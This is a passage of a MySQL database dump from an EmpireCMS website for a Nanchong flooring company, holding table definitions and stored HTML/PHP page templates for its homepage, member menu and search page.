INSERT INTO `libang_enewspublicadd` VALUES (1,0,0,0,0,0,0,0,0,'','','PRVjWHN5JHmy8iF2SxejAkUDmUaRphSN4IMzVKaJzG',0,0,0,'','','',0,100,12,'','',1,0,'npgYX6IpSgQmTO24IJ3dq1mHF13SouEb32FQnOpPoRVfMvluXc5cBOY6Rio0',0,',emp,',0,0,'','','');
/*!40000 ALTER TABLE `libang_enewspublicadd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspubtemp`
--

DROP TABLE IF EXISTS `libang_enewspubtemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspubtemp` (
  `id` smallint(6) NOT NULL AUTO_INCREMENT,
  `indextemp` mediumtext NOT NULL,
  `cptemp` mediumtext NOT NULL,
  `searchtemp` mediumtext NOT NULL,
  `searchjstemp` mediumtext NOT NULL,
  `searchjstemp1` mediumtext NOT NULL,
  `otherlinktemp` mediumtext NOT NULL,
  `downsofttemp` text NOT NULL,
  `onlinemovietemp` text NOT NULL,
  `listpagetemp` text NOT NULL,
  `gbooktemp` mediumtext NOT NULL,
  `loginiframe` mediumtext NOT NULL,
  `otherlinktempsub` tinyint(4) NOT NULL DEFAULT '0',
  `otherlinktempdate` varchar(20) NOT NULL DEFAULT '',
  `loginjstemp` mediumtext NOT NULL,
  `downpagetemp` mediumtext NOT NULL,
  `pljstemp` mediumtext NOT NULL,
  `schalltemp` mediumtext NOT NULL,
  `schallsubnum` smallint(6) NOT NULL DEFAULT '0',
  `schalldate` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspubtemp`
--

LOCK TABLES `libang_enewspubtemp` WRITE;
/*!40000 ALTER TABLE `libang_enewspubtemp` DISABLE KEYS */;
INSERT INTO `libang_enewspubtemp` VALUES (1,'<!DOCTYPE html\r\n    PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n    <meta name=\\\"viewport\\\"\r\n        content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\" />\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\" />\r\n    <title>网站首页 - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/animate.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/flexslider.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\" />\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.flexslider-min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n    [!--temp.header--]\r\n    <div class=\\\"banner\\\">\r\n        <section class=\\\"slider\\\">\r\n            <div class=\\\"flexslider\\\">\r\n                <ul class=\\\"slides\\\">\r\n                    <li><img src=\\\'/images/banner01.jpg\\\' /></li>\r\n                    <li><img src=\\\'/images/banner02.jpg\\\' /></li>\r\n                    <li><img src=\\\'/images/banner03.jpg\\\' /></li>\r\n                </ul>\r\n            </div>\r\n        </section>\r\n    </div>\r\n    <div class=\\\"rmgjc_bg\\\">\r\n        <div class=\\\"rmgjc wow fadeInUp\\\">\r\n            <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n\r\n\r\n                [e:loop={1,3,0,0}]\r\n                <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n                [/e:loop]\r\n            </div>\r\n\r\n\r\n        </div>\r\n    </div>\r\n    <div class=\\\"anli\\\">\r\n        <div class=\\\"sy_title wow fadeInUp\\\">\r\n            <p>工程案例</p>\r\n            <i>CASE</i>\r\n            <span>完善的质量保证体系和售后服务体系</span>\r\n        </div>\r\n        <div class=\\\"anli_content wow fadeInUp\\\">\r\n            <div class=\\\"picScroll-left\\\">\r\n                <a class=\\\"next\\\"></a>\r\n                <div class=\\\"bd\\\">\r\n                    <ul class=\\\"picList\\\">\r\n\r\n\r\n                        [e:loop={18,10,0,1}]\r\n                        <li>\r\n                            <div class=\\\'pic\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><img src=\\\'<?=$bqr[\\\'titlepic\\\']?>\\\' /></a>\r\n                            </div>\r\n                            <div class=\\\'title\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><?=$bqr[\\\'title\\\']?></a></div>\r\n                        </li>\r\n                        [/e:loop]\r\n\r\n                    </ul>\r\n                </div>\r\n                <a class=\\\"prev\\\"></a>\r\n            </div>\r\n        </div>\r\n        <a href=\\\"/gcal/zxal/\\\">了解更多</a>\r\n    </div>\r\n    <div class=\\\"product_bg\\\">\r\n        <div class=\\\"product\\\">\r\n            <div class=\\\"sy_title wow fadeInUp\\\">\r\n                <p>产品中心</p>\r\n                <i>PRODUCTS</i>\r\n                <span>完善的质量保证体系和售后服务体系</span>\r\n            </div>\r\n            <div class=\\\"product_content\\\">\r\n\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/gnxdp/\\\">特殊地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img1.jpg\\\'></dt>\r\n                        [e:loop={7,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/hydp/\\\">环氧地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img2.jpg\\\'></dt>\r\n                        [e:loop={8,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/gdsydp/\\\">高端商业地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img3.jpg\\\'></dt>\r\n                        [e:loop={9,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/hwydcs/\\\">户外及运动场所系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img4.jpg\\\'></dt>\r\n                        [e:loop={10,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/dpcl/\\\">地坪材料</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img5.jpg\\\'></dt>\r\n                        [e:loop={11,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n    <div class=\\\"abouts\\\">\r\n        <div class=\\\"abouts1\\\">\r\n            <div class=\\\"sy_title wow fadeInUp\\\">\r\n                <p>关于丽邦</p>\r\n                <i>ABOUT US</i>\r\n                <span>完善的质量保证体系和售后服务体系</span>\r\n            </div>\r\n            <div class=\\\"shipin wow fadeInRight\\\">\r\n                <div id=\\\"a1\\\"></div>\r\n                <script type=\\\"text/javascript\\\" src=\\\"/js/ckplayer.js\\\" charset=\\\"utf-8\\\"></script>\r\n                <script type=\\\"text/javascript\\\">\r\n                    var flashvars = { f: \\\'/images/shipin.mp4\\\', c: 0, wh: \\\'16:9\\\' };\r\n                    var params = { allowFullScreen: true, allowScriptAccess: \\\'always\\\', wmode: \\\'transparent\\\' };\r\n                    var video = [\\\'/images/shipin.mp4->video/mp4\\\'];\r\n                    CKobject.embed(\\\'/images/ckplayer.swf\\\', \\\'a1\\\', \\\'ckplayer_a1\\\', \\\'351.2\\\', \\\'200\\\', true, flashvars, video, params);\r\n                </script>\r\n                <br/>\r\n                <div id=\\\"a2\\\"></div>\r\n                <script type=\\\"text/javascript\\\" src=\\\"/js/ckplayer.js\\\" charset=\\\"utf-8\\\"></script>\r\n                <script type=\\\"text/javascript\\\">\r\n                    var flashvars1 = { f: \\\'/images/shipin1.mp4\\\', c: 0, wh: \\\'16:9\\\' };\r\n                    var params1 = { allowFullScreen: true, allowScriptAccess: \\\'always\\\', wmode: \\\'transparent\\\' };\r\n                    var video1 = [\\\'/images/shipin1.mp4->video/mp4\\\'];\r\n                    CKobject.embed(\\\'/images/ckplayer.swf\\\', \\\'a2\\\', \\\'ckplayer_a2\\\', \\\'351.2\\\', \\\'200\\\', true, flashvars1, video1, params1);\r\n                </script>\r\n\r\n            </div>\r\n            <div class=\\\"abouts_txt wow fadeInLeft\\\">\r\n                <p> 南充市丽邦装饰工程有限公司，是一家集设计、营销、安装、客服、施工团队为一体，为客户提供一站式服务的专业品牌的康体企业，一直致力于打造“你的满意我们的无限动力”的品牌形象，专注的态度，专业的技术，严谨的全方位的跟踪服务，竭尽所能为用户提供更多、更好、更完善的地坪工程。\r\n                </p><br />\r\n                <p>我们一贯十分重视工程质量，注重施工队伍的建设，拥有各种场地经验的工程技术人员，而且还引进了专业的施工机械设备，使工程建设队伍无论在技术质量还是技术装备方面，都有着无法比拟的优势，经过各类工程的锤炼，目前公司施工队伍有着丰富的施工经验和较强的技术实力，完全有能力完成各类型场地的施工。\r\n                </p>\r\n                <a href=\\\"/gywm/gsjj/\\\">了解详情</a>\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n    <div class=\\\"youshi wow fadeInUp\\\">\r\n        <div class=\\\"youshi_title\\\">\r\n            <p><img src=\\\"/images/youshi_title.jpg\\\" alt=\\\"\\\"></p>\r\n            <span><img src=\\\"/images/youshi_img.jpg\\\" alt=\\\"\\\"></span>\r\n        </div>\r\n        <div class=\\\"youshi_content\\\">\r\n            <div class=\\\"youshi_1 wow bounceInLeft\\\">\r\n                <img src=\\\"/images/youshi_img2.jpg\\\" alt=\\\"\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico1.png\\\" alt=\\\"\\\"></i>\r\n                    <span>做有针对性地坪设计</span>\r\n                    <p>\r\n                        <font>★</font>考察原基层地面，做好数据分析；<br />\r\n                        <font>★</font>详听甲方需求，匹配优质材料；<br />\r\n                        <font>★</font>探讨设计结果，确定设计方案。\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"youshi_1 youshi_2 wow bounceInRight\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico2.png\\\" alt=\\\"\\\"></i>\r\n                    <span>二十年生产施工经验</span>\r\n                    <p>\r\n                        <font>★</font>生产施工负责人二十年相关经验，综合解决各种地坪需求；<br />\r\n                        <font>★</font>多年培养施工队伍二百余人；<br />\r\n                        <font>★</font>两千多项地坪案列，专为同行提供有偿技术支持。\r\n                    </p>\r\n                    <div class=\\\"youshi_1_txt\\\">\r\n                        <i><img src=\\\"/images/youshi_ico3.png\\\" alt=\\\"\\\"></i>\r\n                        <span>管家式服务，售后有保障</span>\r\n                        <p>\r\n                            <font>★</font>所有项目存档保存，终身售后支持；<br />\r\n                            <font>★</font>定期回访，指导使用、保养措施；<br />\r\n                            <font>★</font>不管项目大小，一视同仁。\r\n                        </p>\r\n                    </div>\r\n                </div>\r\n                <img src=\\\"/images/youshi_img3.jpg\\\" alt=\\\"\\\">\r\n            </div>\r\n            <div class=\\\"youshi_1 wow bounceInLeft\\\">\r\n                <img src=\\\"/images/youshi_img4.jpg\\\" alt=\\\"\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico4.png\\\" alt=\\\"\\\"></i>\r\n                    <span>专业资质</span>\r\n\r\n                    <div class=\\\"picMarquee-left\\\">\r\n                        <div class=\\\"bd\\\">\r\n                            <ul class=\\\"picList\\\">\r\n\r\n                                [e:loop={20,10,0,1}]\r\n                                <li>\r\n                                    <div class=\\\"pic\\\"><img src=\\\"<?=$bqr[\\\'titlepic\\\']?>\\\" /></div>\r\n                                </li>\r\n                                [/e:loop]\r\n                            </ul>\r\n                        </div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n\r\n    <div class=\\\"huoban wow fadeInUp\\\">\r\n        <div class=\\\"huoban_title\\\">\r\n            <img src=\\\"/images/huoban_title.png\\\" alt=\\\"\\\">\r\n        </div>\r\n        <div class=\\\"huoban_content\\\">\r\n            <ul>\r\n\r\n                [e:loop={21,8,0,1}]\r\n                <li><img src=\\\"<?=$bqr[\\\'titlepic\\\']?>\\\" /></li>\r\n                [/e:loop]\r\n            </ul>\r\n        </div>\r\n    </div>\r\n    <div class=\\\"news wow fadeInUpBig\\\">\r\n        <div class=\\\"sy_title wow fadeInUp\\\">\r\n            <p>新闻资讯</p>\r\n            <i>NEWS</i>\r\n            <span>完善的质量保证体系和售后服务体系</span>\r\n        </div>\r\n        <div class=\\\"news_content\\\">\r\n            <ul class=\\\"news_l wow fadeInLeft\\\">\r\n                [e:loop={3,4,0,1}]\r\n                <li><img src=\\\'<?=$bqr[\\\'titlepic\\\']?>\\\'>\r\n                    <div class=\\\'news_txt\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><?=$bqr[\\\'title\\\']?>?</a><span>03-09</span>\r\n                        <p><?=$bqr[smalltext]?>...</p>\r\n                    </div>\r\n                </li>\r\n\r\n                [/e:loop]\r\n\r\n\r\n            </ul>\r\n        </div>\r\n        <a href=\\\"/xwzx/qyzx/\\\">查看更多</a>\r\n    </div>\r\n\r\n    [!--temp.footer--]\r\n    <script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <div id=\\\"kefu\\\"></div>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/slick.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/wow.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/rem.min.js\\\"></script>\r\n</body>\r\n\r\n</html>','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<title>[!--pagetitle--] - Powered by EmpireCMS</title>\r\n<meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n<meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n<link href=\\\"[!--news.url--]skin/default/css/style.css\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\r\n<script type=\\\"text/javascript\\\" src=\\\"[!--news.url--]skin/default/js/tabs.js\\\"></script>\r\n</head>\r\n<body class=\\\"listpage\\\">\r\n[!--temp.dtheader--] \r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"10\\\" cellpadding=\\\"0\\\">\r\n<tr valign=\\\"top\\\">\r\n<td class=\\\"list_content\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"position\\\">\r\n<tr>\r\n<td>现在的位置：[!--newsnav--]\r\n</td>\r\n</tr>\r\n</table>\r\n      <table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n        <tr> \r\n          <td width=\\\"300\\\" valign=\\\"top\\\"> \r\n		  <?php\r\n		  $lguserid=intval(getcvar(\\\'mluserid\\\'));//登陆用户ID\r\n		  $lgusername=RepPostVar(getcvar(\\\'mlusername\\\'));//登陆用户\r\n		  $lggroupid=intval(getcvar(\\\'mlgroupid\\\'));//会员组ID\r\n		  if($lggroupid)	//登陆会员显示菜单\r\n		  {\r\n		  ?>\r\n            <table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" class=\\\"tableborder\\\">\r\n              <tr class=\\\"header\\\"> \r\n                <td height=\\\"20\\\" bgcolor=\\\"#FFFFFF\\\"> <div align=\\\"center\\\"><strong><a href=\\\"[!--news.url--]e/member/cp/\\\">功能菜单</a></strong></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/EditInfo/\\\">修改资料</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/my/\\\">帐号状态</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/msg/\\\">站内信息</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/mspace/SetSpace.php\\\">空间设置</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/DoInfo/\\\">管理信息</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/fava/\\\">收藏夹</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/payapi/\\\">在线支付</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/friend/\\\">我的好友</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/buybak/\\\">消费记录</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/buygroup/\\\">在线充值</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/card/\\\">点卡充值</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"#ecms\\\" onclick=\\\"window.open(\\\'[!--news.url--]e/ShopSys/buycar/\\\',\\\'\\\',\\\'width=680,height=500,scrollbars=yes,resizable=yes\\\');\\\">我的购物车</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/ShopSys/ListDd/\\\">我的订单</a></div></td>\r\n              </tr>\r\n			  <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/login/\\\">重新登陆</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/doaction.php?enews=exit\\\" onclick=\\\"return confirm(\\\'确认要退出?\\\');\\\">退出登陆</a></div></td>\r\n              </tr>\r\n            </table>\r\n			<?php\r\n			}\r\n			else	//游客显示菜单\r\n			{\r\n			?>  \r\n            <table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" class=\\\"tableborder\\\">\r\n              <tr class=\\\"header\\\"> \r\n                <td height=\\\"20\\\" bgcolor=\\\"#FFFFFF\\\"> <div align=\\\"center\\\"><strong><a href=\\\"[!--news.url--]e/member/cp/\\\">功能菜单</a></strong></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/login/\\\">会员登陆</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/member/register/\\\">注册帐号</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"[!--news.url--]e/DoInfo/\\\">发布投稿</a></div></td>\r\n              </tr>\r\n              <tr> \r\n                <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\" onmouseout=\\\"this.style.backgroundColor=\\\'#ffffff\\\'\\\" onmouseover=\\\"this.style.backgroundColor=\\\'#EBF3FC\\\'\\\"><div align=\\\"center\\\"><a href=\\\"#ecms\\\" onclick=\\\"window.open(\\\'[!--news.url--]e/ShopSys/buycar/\\\',\\\'\\\',\\\'width=680,height=500,scrollbars=yes,resizable=yes\\\');\\\">我的购物车</a></div></td>\r\n              </tr>\r\n            </table>\r\n			<?php\r\n			}\r\n			?>\r\n			</td>\r\n          <td width=\\\"85%\\\" valign=\\\"top\\\">[!--empirenews.template--]</td>\r\n        </tr>\r\n      </table></td>\r\n</tr>\r\n</table>\r\n[!--temp.footer--]\r\n</body>\r\n</html>','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<title>高级搜索 - Powered by EmpireCMS</title>\r\n<link href=\\\"[!--news.url--]skin/default/css/style.css\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\r\n<script type=\\\"text/javascript\\\" src=\\\"[!--news.url--]skin/default/js/tabs.js\\\"></script>\r\n<script src=\\\"[!--news.url--]e/data/images/setday.js\\\"></script>\r\n</head>\r\n<body class=\\\"listpage\\\">\r\n[!--temp.dtheader--]\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"10\\\" cellpadding=\\\"0\\\">\r\n	<tr valign=\\\"top\\\">\r\n		<td class=\\\"list_content\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"position\\\">\r\n				<tr>\r\n					<td>现在的位置：[!--url--]</td>\r\n				</tr>\r\n			</table>\r\n			<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n				<tr>\r\n					<td><table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\">\r\n						<tr>\r\n							<td><form action=\\\'[!--news.url--]e/search/index.php\\\' method=\\\"post\\\" name=\\\"search_news\\\" id=\\\"search_news\\\">\r\n									<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\">\r\n										<tr>\r\n											<td width=\\\"54%\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"6\\\" cellspacing=\\\"0\\\">\r\n													<tr>\r\n														<td bgcolor=\\\"#F4F4F4\\\"><strong>搜索范围</strong></td>\r\n													</tr>\r\n											</table></td>\r\n											<td width=\\\"46%\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"6\\\" cellspacing=\\\"0\\\">\r\n													<tr>\r\n														<td bgcolor=\\\"#F4F4F4\\\"><strong>搜索栏目</strong></td>\r\n													</tr>\r\n											</table></td>\r\n										</tr>\r\n										<tr>\r\n											<td valign=\\\"top\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"6\\\" cellspacing=\\\"0\\\">\r\n													<tr>\r\n														<td><input type=\\\"radio\\\" name=\\\"show\\\" value=\\\"title\\\" checked=\\\"checked\\\" />\r\n															标题\r\n															<input type=\\\"radio\\\" name=\\\"show\\\" value=\\\"smalltext\\\" />\r\n															简介\r\n															<input type=\\\"radio\\\" name=\\\"show\\\" value=\\\"newstext\\\" />\r\n															内容\r\n															<input type=\\\"radio\\\" name=\\\"show\\\" value=\\\"writer\\\" />\r\n															作者\r\n															<input name=\\\"show\\\" type=\\\"radio\\\" 